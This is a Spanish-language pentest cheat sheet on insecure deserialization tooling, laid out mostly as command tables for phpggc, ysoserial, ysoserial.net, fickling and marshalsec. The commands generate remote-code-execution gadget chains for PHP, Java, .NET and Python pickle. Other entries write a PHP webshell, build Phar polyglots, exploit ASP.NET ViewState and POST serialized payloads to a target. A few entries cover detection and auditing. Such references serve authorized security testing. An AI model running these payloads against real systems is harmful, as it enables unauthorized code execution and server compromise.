---
aliases:
  - phpggc
  - ysoserial
  - ysoserial.net
  - fickling
  - marshalsec
tags:
  - type/tool
  - vuln/insecure-deser
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[Insecure Deserialization]]'
---
# Insecure Deserialization - Tooling

***

## phpggc (PHP)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Instalación | `git clone https://github.com/ambionics/phpggc && cd phpggc` | PHP CLI. |
| Listar gadgets | `./phpggc -l` | Muestra todos los chains disponibles por framework. |
| Filtrar por framework | `./phpggc -l Monolog` | Solo Monolog (logger). |
| Generar RCE Monolog | `./phpggc Monolog/RCE1 system "id"` | Output: serializado PHP. |
| Generar para Laravel | `./phpggc Laravel/RCE9 system "id"` | Frameworks comunes. |
| Generar para WordPress | `./phpggc WordPress/RCE1 system "id"` | WP gadget chain. |
| Generar para Symfony | `./phpggc Symfony/RCE1 system "id"` | Symfony chains. |
| Output base64 | `./phpggc -b Monolog/RCE1 system "id"` | Ya base64 encoded. |
| Output url-encoded | `./phpggc -u Monolog/RCE1 system "id"` | Para inyectar en GET. |
| Output JSON-safe | `./phpggc -ud Monolog/RCE1 system "id"` | Doble encoding url. |
| Wrap en Phar | `./phpggc -p phar -pj polyglot.jpg Monolog/RCE1 system "id" -o evil.phar` | Phar polyglot — para LFI + Phar. |
| File write | `./phpggc Guzzle/FW1 /var/www/html/sh.php '<?=\`$_GET[c]\`?>'` | Escribir webshell. |
| Test gadget | `./phpggc -t -p phar Monolog/RCE1 system "id"` | Verifica que funciona en stack PHP local. |
^deser-tool-phpggc

___

## ysoserial (Java)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Descargar JAR | `wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar` | Releases oficiales. |
| Listar gadgets | `java -jar ysoserial-all.jar` | Lista todos los chains. |
| Generar URLDNS (probe) | `java -jar ysoserial-all.jar URLDNS "http://canary.oast.fun/" \| base64 -w0` | Canary sin RCE. |
| CommonsCollections1-7 | `java -jar ysoserial-all.jar CommonsCollections5 "id"` | Apache Commons Collections. |
| CommonsBeanutils | `java -jar ysoserial-all.jar CommonsBeanutils1 "id"` | Spring + Beanutils. |
| Spring1/Spring2 | `java -jar ysoserial-all.jar Spring1 "id"` | Spring framework. |
| Hibernate1 | `java -jar ysoserial-all.jar Hibernate1 "id"` | Hibernate ORM. |
| JBossInterceptors1 | `java -jar ysoserial-all.jar JBossInterceptors1 "id"` | JBoss EAP. |
| Groovy1 | `java -jar ysoserial-all.jar Groovy1 "id"` | Groovy en classpath. |
| MozillaRhino1 | `java -jar ysoserial-all.jar MozillaRhino1 "id"` | Rhino JS engine. |
| ROME (Apache) | `java -jar ysoserial-all.jar ROME "id"` | RSS feed lib. |
| Output binary directo | `java -jar ysoserial-all.jar CommonsCollections5 "id" > rce.bin` | Sin base64. |
| Combinar con curl | `curl -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary @rce.bin https://target/` | Direct POST. |
| Modified ysoserial (con más gadgets) | `https://github.com/wh1t3p1g/ysoserial` (fork)  | Más chains modernos. |
^deser-tool-ysoserial

___

## ysoserial.net (.NET)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Descargar | `https://github.com/pwntester/ysoserial.net/releases` | Windows binary. |
| Listar gadgets | `ysoserial.net.exe --list` | Gadgets + formatters. |
| Listar formatters | `ysoserial.net.exe --formatter-list` | Formats: BinaryFormatter, LosFormatter, etc. |
| TextFormattingRunProperties | `ysoserial.net.exe -g TextFormattingRunProperties -f BinaryFormatter -c "calc"` | Default reliable. |
| TypeConfuseDelegate | `ysoserial.net.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc"` | Bypass de filtros. |
| ObjectDataProvider | `ysoserial.net.exe -g ObjectDataProvider -f Json.Net -c "calc"` | Para JSON.NET. |
| WindowsClaimsIdentity | `ysoserial.net.exe -g WindowsClaimsIdentity -f BinaryFormatter -c "calc"` | .NET Framework 4.7+. |
| ViewState exploit (no MAC) | `ysoserial.net.exe -p ViewState -g TextFormattingRunProperties -c "calc" --path="/test.aspx" --apppath="/"` | Sin validation key. |
| ViewState con validation key | `--validationkey=<hex> --validationalg=SHA1 --decryptionkey=<hex> --decryptionalg=AES` | Con keys del web.config. |
| Output base64 | `--output=base64` | Default. |
| Output raw | `--output=raw > payload.bin` | Sin encoding. |
| Output URL-encoded | `--output=urlencoded` | Para POST forms. |
| TestPlugin | `--test --plugin=...` | Verifica que funciona local. |
^deser-tool-ysoserialnet

___

## fickling (Python pickle)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Instalación | `pip install fickling` | Análisis + exploit pickle. |
| Análisis estático | `fickling --check evil.pkl` | Detecta opcodes peligrosos sin ejecutar. |
| Decompile | `fickling --decompile evil.pkl` | Reconstruye Python equivalente. |
| Trace ejecución | `fickling --trace evil.pkl` | Simula sin ejecutar opcodes peligrosos. |
| Inyectar en pickle existente | `fickling --inject 'os.system("id")' benign.pkl > evil.pkl` | Injection en archivo legítimo. |
| Crear pickle malicioso | `fickling --create 'os.system("id")' evil.pkl` | Desde cero. |
| Output base64 | `fickling --create 'os.system("id")' - \| base64 -w0` | Stdout + b64. |
| Hook unsafe sinks | `fickling install --hook-strict` | Globally hookea pickle.loads para safety. |
| Force-decompile model ML | `fickling --decompile model.joblib` | Auditar models pickle. |
| Manual con pickle | `python3 -c "import pickle, os; class E: ___ def __reduce__(self): return (os.system, ('id',)); print(pickle.dumps(E()))"` | Sin tool externa. |
^deser-tool-fickling

___

## Otros tools

| **Tool** | **Lenguaje / Formato** | **Uso** |
|:---:|:---:|:---:|
| `marshalsec` | XStream / SnakeYAML / Jackson / Hessian / Burlap / RMI / JBoss / etc | `java -jar marshalsec.jar Jackson "<gadget>" "<cmd>"` |
| `JNDI-Injection-Exploit` | RMI/LDAP servers para chain con deser | LDAP/RMI listener para Log4Shell-style. |
| `JNDIExploit` (welk1n fork) | RMI/LDAP server alt | Más gadgets. |
| `gadgetinspector` | Análisis estático de classpath Java | Encuentra gadgets nuevos. |
| `freddy` | Burp extension auto-detección deser | Pasivo en historial. |
| `Java Deserialization Scanner` | Burp extension active scanning | Probe de gadgets en endpoints. |
| `ViewState YSO Generator` | Web UI para ViewState | https://github.com/0xACB/viewgen |
| `viewgen` | CLI para ViewState | Alternativa a ysoserial.net solo para ViewState. |
| `pickleinspector` | Audit pickle | Análogo a fickling, menos features. |
| `node-deser-checker` | Audit Node.js | Detecta uso de node-serialize. |
| `awesome-fastjson` | Repo con gadgets FastJson | https://github.com/safe6Sec/Fastjson |
^deser-tool-others

***
